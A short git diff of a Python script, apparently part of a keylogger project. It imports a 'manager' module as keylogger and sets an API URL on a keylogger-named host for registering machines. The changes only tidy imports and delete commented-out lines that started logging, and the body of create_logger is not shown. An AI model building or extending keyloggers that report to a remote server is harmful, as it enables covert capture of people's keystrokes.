@@ -1,7 +1,8 @@
 import manager as keylogger
-import requests,socket
-import uuid
+import requests, uuid, socket
+
 url = 'https://keylogger.shuvax.com/api/create_machine'
+
 
 
 def create_logger():
@@ -27,5 +28,3 @@ def create_logger():
 
 if __name__ == "__main__":
     create_logger()
-    # key_logger = keylogger.KeyLoggerManager(123)
-    # key_logger.start_logging()
